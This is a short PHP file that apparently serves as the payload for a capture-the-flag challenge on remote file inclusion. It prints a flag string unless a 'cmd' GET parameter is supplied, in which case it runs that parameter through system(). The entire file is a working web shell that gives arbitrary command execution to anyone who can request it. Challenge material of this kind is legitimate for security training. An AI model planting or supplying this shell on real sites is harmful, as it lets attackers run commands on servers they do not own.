<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Flag: RFI{you_included_a_remote_file}";
}
?>
